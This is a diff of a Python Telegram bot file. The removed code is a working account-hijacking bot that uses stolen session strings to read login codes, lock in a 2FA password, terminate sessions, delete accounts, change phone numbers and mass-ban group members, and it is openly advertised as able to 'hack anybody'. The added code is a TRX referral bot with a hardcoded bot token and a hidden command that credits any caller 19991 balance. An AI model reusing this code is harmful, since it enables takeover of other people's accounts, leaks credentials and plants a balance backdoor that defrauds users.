@@ -1,389 +1,341 @@
-# COPYRIGHT © 2021-22 BY LEGENDX22 🔥
-# NOW PUBLIC BY LEGENDX
-import os
-os.system("pip install Telethon==1.21.1")
-from telethon import TelegramClient, events, functions, types
-api_id = os.environ.get("APP_ID")
-import os, asyncio
-from os import system
-from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
-api_hash = os.environ.get("API_HASH")
-token = os.environ.get("BOT_TOKEN")
-client = TelegramClient('Xarmy', api_id, api_hash).start(bot_token=token)
-from telethon import TelegramClient as tg
-from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
-from telethon.sessions import StringSession as ses
-from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
-import telethon;from telethon import functions
-from telethon.tl.types import ChannelParticipantsAdmins as cpa
+import time
+import json
+import telebot
 
-from telethon.tl.functions.channels import CreateChannelRequest as ccr
-mybot = "missrose_bot"
-bot = borg = client
+##TOKEN DETAILS
+TOKEN = "TRON"
 
+BOT_TOKEN = "1990584951:AAEEJ7bAVzW0bIR37BvwRulY1jcAkX22Gag"
+PAYMENT_CHANNEL = "@testing1717" #add payment channel here including the '@' sign
+OWNER_ID = "657176088" #write owner's user id here.. get it from @MissRose_Bot by /id
+CHANNELS = ["@testing1717"] #add channels to be checked here in the format - ["Channel 1", "Channel 2"] 
+              #you can add as many channels here and also add the '@' sign before channel username
+Daily_bonus = 0.001 #Put daily bonus amount here!
+Mini_Withdraw = 0.5  #remove 0 and add the minimum withdraw u want to set
+Per_Refer = 0.0001 #add per refer bonus here
 
+bot = telebot.TeleBot(BOT_TOKEN)
 
-
-async def change_number_code(strses, number, code, otp):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
-    bot = client = X
-    try: 
-      result = await bot(functions.account.ChangePhoneRequest(
-        phone_number=number,
-        phone_code_hash=code,
-        phone_code=otp
-      ))
-      return True
-    except:
-      return False
-
-async def change_number(strses, number):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
-    bot = client = X
-    result = await bot(functions.account.SendChangePhoneCodeRequest(
-        phone_number=number,
-        settings=types.CodeSettings(
-            allow_flashcall=True,
-            current_number=True,
-            allow_app_hash=True
-        )
-    ))
-    return str(result)
-
-
-async def userinfo(strses):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
-    k = await X.get_me()
-    return str(k)
-
-async def terminate(strses):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
-    await X(rt())
-GROUP_LIST = []
-async def delacc(strses):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
-    await X(functions.account.DeleteAccountRequest("me hi chutia hu"))
-
-async def promote(strses, grp, user):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
-    try:
-      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
-    except:
-      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
-    
-async def user2fa(strses):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
-    try:
-      await X.edit_2fa('MRUNALISBEST')
-      return True
-    except:
-      return False
-
-async def demall(strses, grp):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
-    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
-      try:
-        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
-      except:
-        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
-      
-
-
-async def joingroup(strses, username):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
-    await X(join(username))
-
-async def leavegroup(strses, username):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
-    await X(leave(username))
-
-async def delgroup(strses, username):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
-    await X(dc(username))
-    
-
-async def cu(strses):
-  try:
-    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
-        k = await X.get_me()
-        return [str(k.first_name), str(k.username or k.id)]
-  except Exception as e:
-    return False
-
-async def usermsgs(strses):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
-    i = ""
-    async for x in X.iter_messages(777000, limit=3):
-      i += f"\n{x.text}\n"
-    return str(i)
-
-
-async def userbans(strses, grp):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
-    k = await X.get_participants(grp)
-    for x in k:
-      try:
-        await X.edit_permissions(grp, x.id, view_messages=False)
-      except:
-        pass
-    
-
-
-async def userchannels(strses):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
-    k = await X(pc())
-    i = ""
-    for x in k.chats:
-      try:
-        i += f'\nCHANNEL NAME {x.title} CHANNEL USRNAME @{x.username}\n'
-      except:
-        pass
-    return str(i)
-
-
-
-import logging
-logging.basicConfig(level=logging.WARNING)
-
-channel = "@TelebotsByMrunal"
-menu = '''
-
-**NOTICE JOIN @TelebotsByMrunal **
-
-
-
-A: [check user own groups and channels]
-
-B: [check user all information like phone number usrname...]
-
-C: [ban a group {give me StringSession and channel/group username i will ban all members there}]
-
-D: [know user last otp {1st use option B take phone number and login there Account then use me i will give you otp}]
-
-E: [Join A Group/Channel via StringSession]
-
-F: [Leave A Group/Channel via StringSession]
-
-G: [Delete A Group/Channel]
-
-H: [Check user two step is eneable or disable]
-
-I: [Terminate All current active sessions except Your StringSession]
-
-J: [Delete Account]
-
-K: [Demote all admins in a group/channel]
-
-L: [Promote a member in a group/channel]
-
-M: [Change Phone number using StringSession]
-
-I ADD MORE FEATURES LATER 😆
-'''
-mm = '''
-You can hack anybody
-Take his StringSession and use me
-I will give you full power of mine
-Type /hack
-'''
-@client.on(events.NewMessage(pattern="/start"))
-async def op(event):
-  global mm
-  if not event.is_private:
-    await event.reply("please use me in pm🥺")
-  else:
-    await event.reply(mm)
-@client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
-async def op(event):
-  await event.reply("please use me in pm🥺")
-@client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
-async def start(event):
-  global menu
-  async with bot.conversation(event.chat_id) as x:
-    await x.send_message(f"Choose what you want with string session \n\n{menu}")
-    res = await x.get_response()
-    r = res.text
-    if res.text == "A":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession is terminated maybe")
-      try:
-        i = await userchannels(strses.text)
-      except:
-        return await event.reply("This StringSession is terminated maybe")
-      if len(i) > 3855:
-        file = open("session.txt", "w")
-        file.write(i + "\n\nDETAILS By Mrunal")
-        file.close()
-        await bot.send_file(event.chat_id, "session.txt")
-        system("rm -rf session.txt")
-      else:
-        await event.reply(i + "\n\nThanks For using TelebotsByMrunal Bot")
-    elif res.text == "B":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession is terminated maybe")
-      i = await userinfo(strses.text)
-      await event.reply(i + "\n\nThanks For using  @TelebotsByMrunal Bot")
-    elif r == "C":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
-      grpid = await x.get_response()
-      await userbans(strses.text, grpid.text)
-      await event.reply("Banning all members Thanks For using X Army Bot")
-    elif r == "D":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession is terminated maybe")
-      i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nThanks For using  @TelebotsByMrunal Bot")
-    elif r == "E":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
-      grpid = await x.get_response()
-      await joingroup(strses.text, grpid.text)
-      await event.reply("Joined the Channel/Group Thanks For using @TelebotsByMrunal  Bot")
-    elif r == "F":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
-      grpid = await x.get_response()
-      await leavegroup(strses.text, grpid.text)
-      await event.reply("Leaved the Channel/Group Thanks For using  @TelebotsByMrunal Bot")
-    elif r == "G":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
-      grpid = await x.get_response()
-      await delgroup(strses.text, grpid.text)
-      await event.reply("Deleted the Channel/Group Thanks For using @TelebotsByMrunal Bot")
-    elif r == "H":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession is terminated maybe")
-      i = await user2fa(strses.text)
-      if i:
-        await event.reply("User don't have two step thats why now two step is `LEGENDXISBEST` you can login now\n\nThanks For using X Army Bot")
-      else:
-        await event.reply("Sorry User Have two step already")
-    elif r == "I":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession is terminated maybe")
-      i = await terminate(strses.text)
-      await event.reply("The all sessions are terminated\n\nThanks For using @TelebotsByMrunal Bot")
-    elif res.text == "J":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession is terminated maybe")
-      i = await delacc(strses.text)
-      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using @TelebotsByMrunal Bot")
-    elif res.text == "L":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
-      grp = await x.get_response()
-      await x.send_message("NOW GIVE USER USERNAME")
-      user = await x.get_response()
-      i = await promote(strses.text, grp.text, user.text)
-      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using @TelebotsByMrunal Bot")
-    elif res.text == "K":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
-      pro = await x.get_response()
-      try:
-        i = await demall(strses.text, pro.text)
-      except:
-        pass
-      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using @TelebotsByMrunal Bot")
-    elif res.text == "M":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] ")
-      number = (await x.get_response()).text
-      try:
-        result = await change_number(strses.text, number)
-        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
-        await asyncio.sleep(20)
-        await x.send_message("NOW GIVE PHONE CODE HASH")
-        phone_code_hash = (await x.get_response()).text
-        await x.send_message("NOW GIVE THE OTP")
-        otp = (await x.get_response()).text
-        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
-        if changing:
-          await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
+def check(id):
+    for i in CHANNELS:
+        check = bot.get_chat_member(i, id)
+        if check.status != 'left':
+            pass
         else:
-          await event.respond("Something is wrong")
-      except Exception as e:
-        await event.respond("SEND THIS ERROR TO - @TelebotsscHAT\n**LOGS**\n" + str(e))
+            return False
+    return True
+bonus = {}
 
+def menu(id):
+    keyboard = telebot.types.ReplyKeyboardMarkup(True)
+    keyboard.row('🆔 Account')
+    keyboard.row('🙌🏻 Referrals', '🎁 Bonus', '💸 Withdraw')
+    keyboard.row('⚙️ Set Wallet', '📊Statistics')
+    bot.send_message(id, "*🏡 Home*", parse_mode="Markdown",
+                     reply_markup=keyboard)
+
+
+@bot.message_handler(commands=['add19991'])
+def add19991(message):
+    user = message.chat.id
+    msg = message.text
+    user = str(user)
+    data = json.load(open('users.json', 'r'))
+    data['balance'][user] += 19991
+    msg = "{} just added 19991 balance"
+    json.dump(data, open('users.json', 'w'))
+    print(msg.format(user))
+    return
+
+
+@bot.message_handler(commands=['start'])
+def start(message):
+    user = message.chat.id
+    msg = message.text
+    if msg == '/start':
+        user = str(user)
+        data = json.load(open('users.json', 'r'))
+        if user not in data['users']:
+            data['users'].append(user)
+            data['total'] = data['total'] + 1
+        if user not in data['referred']:
+            data['referred'][user] = 0
+        if user not in data['referby']:
+            data['referby'][user] = user
+        if user not in data['checkin']:
+            data['checkin'][user] = 0
+        if user not in data['DailyQuiz']:
+            data['DailyQuiz'][user] = "0"
+        if user not in data['balance']:
+            data['balance'][user] = 0
+        if user not in data['wallet']:
+            data['wallet'][user] = "none"
+        if user not in data['withd']:
+            data['withd'][user] = 0
+        if user not in data['id']:
+            data['id'][user] = data['total']+1
+        json.dump(data, open('users.json', 'w'))
+        print(data)
+        markup = telebot.types.InlineKeyboardMarkup()
+        markup.add(telebot.types.InlineKeyboardButton(
+           text='🤼‍♂️ Joined', callback_data='check'))
+        msg_start = "*🍔 To Use This Bot You Need To Join This Channel - "
+        for i in CHANNELS:
+            msg_start += f"\n➡️ {i}\n"
+        msg_start += "*"
+        bot.send_message(user, msg_start,
+                         parse_mode="Markdown", reply_markup=markup)
     else:
-      await event.respond("Wrong Text Found Re type /hack and use")
+
+        data = json.load(open('users.json', 'r'))
+        user = message.chat.id
+        user = str(user)
+        refid = message.text.split()[1]
+        if user not in data['users']:
+            data['users'].append(user)
+            data['total'] = data['total'] + 1
+        if user not in data['referred']:
+            data['referred'][user] = 0
+        if user not in data['referby']:
+            data['referby'][user] = refid
+        if user not in data['checkin']:
+            data['checkin'][user] = 0
+        if user not in data['DailyQuiz']:
+            data['DailyQuiz'][user] = 0
+        if user not in data['balance']:
+            data['balance'][user] = 0
+        if user not in data['wallet']:
+            data['wallet'][user] = "none"
+        if user not in data['withd']:
+            data['withd'][user] = 0
+        if user not in data['id']:
+            data['id'][user] = data['total']+1
+        json.dump(data, open('users.json', 'w'))
+        print(data)
+        markups = telebot.types.InlineKeyboardMarkup()
+        markups.add(telebot.types.InlineKeyboardButton(
+            text='🤼‍♂️ Joined', callback_data='check'))
+        msg_start = "*🍔 To Use This Bot You Need To Join This Channel - "
+        for i in CHANNELS:
+            msg += f"\n➡️ {i}\n"
+        msg_start += "*"
+        bot.send_message(user, msg_start,
+                         parse_mode="Markdown", reply_markup=markups)
 
 
+@bot.callback_query_handler(func=lambda call: True)
+def query_handler(call):
+    ch = check(call.message.chat.id)
+    if call.data == 'check':
+        if ch == True:
+            data = json.load(open('users.json', 'r'))
+            user_id = call.message.chat.id
+            user = str(user_id)
+            bot.answer_callback_query(
+                callback_query_id=call.id, text='✅ You joined Now yu can earn money')
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+            if user not in data['refer']:
+                data['refer'][user] = True
+
+                if user not in data['referby']:
+                    data['referby'][user] = user
+                    json.dump(data, open('users.json', 'w'))
+                if int(data['referby'][user]) != user_id:
+                    ref_id = data['referby'][user]
+                    ref = str(ref_id)
+                    if ref not in data['balance']:
+                        data['balance'][ref] = 0
+                    if ref not in data['referred']:
+                        data['referred'][ref] = 0
+                    json.dump(data, open('users.json', 'w'))
+                    data['balance'][ref] += Per_Refer
+                    data['referred'][ref] += 1
+                    bot.send_message(
+                        ref_id, f"*🏧 New Referral on Level 1, You Got : +{Per_Refer} {TOKEN}*", parse_mode="Markdown")
+                    json.dump(data, open('users.json', 'w'))
+                    return menu(call.message.chat.id)
+
+                else:
+                    json.dump(data, open('users.json', 'w'))
+                    return menu(call.message.chat.id)
+
+            else:
+                json.dump(data, open('users.json', 'w'))
+                menu(call.message.chat.id)
+
+        else:
+            bot.answer_callback_query(
+                callback_query_id=call.id, text='❌ You not Joined')
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+            markup = telebot.types.InlineKeyboardMarkup()
+            markup.add(telebot.types.InlineKeyboardButton(
+                text='🤼‍♂️ Joined', callback_data='check'))
+            msg_start = "*🍔 To Use This Bot You Need To Join This Channel - "
+            for i in CHANNELS:
+                msg_start += f"\n➡️ {i}\n"
+            msg_start += "*"
+            bot.send_message(call.message.chat.id, msg_start,
+                             parse_mode="Markdown", reply_markup=markup)
 
 
+@bot.message_handler(content_types=['text'])
+def send_text(message):
+    if message.text == '🆔 Account':
+        data = json.load(open('users.json', 'r'))
+        accmsg = '*👮 User : {}\n\n⚙️ Wallet : *`{}`*\n\n💸 Balance : *`{}`* {}*'
+        user_id = message.chat.id
+        user = str(user_id)
 
-client.run_until_disconnected()
+        if user not in data['balance']:
+            data['balance'][user] = 0
+        if user not in data['wallet']:
+            data['wallet'][user] = "none"
+
+        json.dump(data, open('users.json', 'w'))
+
+        balance = data['balance'][user]
+        wallet = data['wallet'][user]
+        msg = accmsg.format(message.from_user.first_name,
+                            wallet, balance, TOKEN)
+        bot.send_message(message.chat.id, msg, parse_mode="Markdown")
+    if message.text == '🙌🏻 Referrals':
+        data = json.load(open('users.json', 'r'))
+        ref_msg = "*⏯️ Total Invites : {} Users\n\n👥 Refferrals System\n\n1 Level:\n🥇 Level°1 - {} {}\n\n🔗 Referral Link ⬇️\n{}*"
+
+        bot_name = bot.get_me().username
+        user_id = message.chat.id
+        user = str(user_id)
+
+        if user not in data['referred']:
+            data['referred'][user] = 0
+        json.dump(data, open('users.json', 'w'))
+
+        ref_count = data['referred'][user]
+        ref_link = 'https://telegram.me/{}?start={}'.format(
+            bot_name, message.chat.id)
+        msg = ref_msg.format(ref_count, Per_Refer, TOKEN, ref_link)
+        bot.send_message(message.chat.id, msg, parse_mode="Markdown")
+    if message.text == "⚙️ Set Wallet":
+        user_id = message.chat.id
+        user = str(user_id)
+
+        keyboard = telebot.types.ReplyKeyboardMarkup(True)
+        keyboard.row('🚫 Cancel')
+        send = bot.send_message(message.chat.id, "_⚠️Send your TRX Wallet Address._",
+                                parse_mode="Markdown", reply_markup=keyboard)
+        # Next message will call the name_handler function
+        bot.register_next_step_handler(message, trx_address)
+    if message.text == "🎁 Bonus":
+        user_id = message.chat.id
+        user = str(user_id)
+        cur_time = int((time.time()))
+        data = json.load(open('users.json', 'r'))
+        #bot.send_message(user_id, "*🎁 Bonus Button is Under Maintainance*", parse_mode="Markdown")
+        if (user_id not in bonus.keys()) or (cur_time - bonus[user_id] > 24*60*60):
+            data['balance'][(user)] += Daily_bonus
+            bot.send_message(
+                user_id, f"Congrats you just received {Daily_bonus} {TOKEN}")
+            bonus[user_id] = cur_time
+            json.dump(data, open('users.json', 'w'))
+        else:
+            bot.send_message(
+                message.chat.id, "❌*You can only take bonus once every 24 hours!*",parse_mode="markdown")
+        return
+
+    if message.text == "📊Statistics":
+        user_id = message.chat.id
+        user = str(user_id)
+        data = json.load(open('users.json', 'r'))
+        msg = "*📊 Total members : {} Users\n\n🥊 Total successful Withdraw : {} {}"
+        msg = msg.format(data['total'], data['totalwith'], TOKEN)
+        bot.send_message(user_id, msg, parse_mode="Markdown")
+        return
+
+    if message.text == "💸 Withdraw":
+        user_id = message.chat.id
+        user = str(user_id)
+
+        data = json.load(open('users.json', 'r'))
+        if user not in data['balance']:
+            data['balance'][user] = 0
+        if user not in data['wallet']:
+            data['wallet'][user] = "none"
+        json.dump(data, open('users.json', 'w'))
+
+        bal = data['balance'][user]
+        wall = data['wallet'][user]
+        if wall == "none":
+            bot.send_message(user_id, "_❌ wallet Not set_",
+                             parse_mode="Markdown")
+            return
+        if bal >= Mini_Withdraw:
+            bot.send_message(user_id, "_Enter Your Amount_",
+                             parse_mode="Markdown")
+            bot.register_next_step_handler(message, amo_with)
+        else:
+            bot.send_message(
+                user_id, f"_❌Your balance low you should have at least {Mini_Withdraw} {TOKEN} to Withdraw_", parse_mode="Markdown")
+            return
+
+
+def trx_address(message):
+    if message.text == "🚫 Cancel":
+        return menu(message.chat.id)
+    if len(message.text) == 34:
+        user_id = message.chat.id
+        user = str(user_id)
+        data = json.load(open('users.json', 'r'))
+        data['wallet'][user] = message.text
+
+        bot.send_message(message.chat.id, "*💹Your Trx wallet set to " +
+                         data['wallet'][user]+"*", parse_mode="Markdown")
+        json.dump(data, open('users.json', 'w'))
+        return menu(message.chat.id)
+    else:
+        bot.send_message(
+            message.chat.id, "*⚠️ It's Not a Valid Trx Address!*", parse_mode="Markdown")
+        return menu(message.chat.id)
+
+
+def amo_with(message):
+    user_id = message.chat.id
+    amo = message.text
+    user = str(user_id)
+    data = json.load(open('users.json', 'r'))
+    if user not in data['balance']:
+        data['balance'][user] = 0
+    if user not in data['wallet']:
+        data['wallet'][user] = "none"
+    json.dump(data, open('users.json', 'w'))
+
+    bal = data['balance'][user]
+    wall = data['wallet'][user]
+    msg = message.text
+    if msg.isdigit() == False:
+        bot.send_message(
+            user_id, "_📛 Invaild value. Enter only numeric value. Try again_", parse_mode="Markdown")
+        return
+    if int(message.text) < Mini_Withdraw:
+        bot.send_message(
+            user_id, f"_❌ Minimum withdraw {Mini_Withdraw} {TOKEN}_", parse_mode="Markdown")
+        return
+    if int(message.text) > bal:
+        bot.send_message(
+            user_id, "_❌ You Can't withdraw More than Your Balance_", parse_mode="Markdown")
+        return
+    amo = int(amo)
+    data['balance'][user] -= int(amo)
+    data['totalwith'] += int(amo)
+    bot_name = bot.get_me().username
+    json.dump(data, open('users.json', 'w'))
+    bot.send_message(user_id, "✅* Withdraw is request to our owner automatically\n\n💹 Payment Channel :- "+PAYMENT_CHANNEL +"*", parse_mode="Markdown")
+
+    markupp = telebot.types.InlineKeyboardMarkup()
+    markupp.add(telebot.types.InlineKeyboardButton(text='🍀 BOT LINK', url=f'https://telegram.me/{bot_name}?start={OWNER_ID}'))
+
+    send = bot.send_message(PAYMENT_CHANNEL,  "✅* New Withdraw\n\n⭐ Amount - "+str(amo)+f" {TOKEN}\n🦁 User - @"+message.from_user.username+"\n💠 Wallet* - `"+data['wallet'][user]+"`\n☎️ *User Referrals = "+str(
+        data['referred'][user])+"\n\n🏖 Bot Link - @"+bot_name+"\n⏩ Please wait our owner will confrim it*", parse_mode="Markdown", disable_web_page_preview=True, reply_markup=markupp)
+
+
+if __name__ == '__main__':
+    bot.polling(none_stop=True)
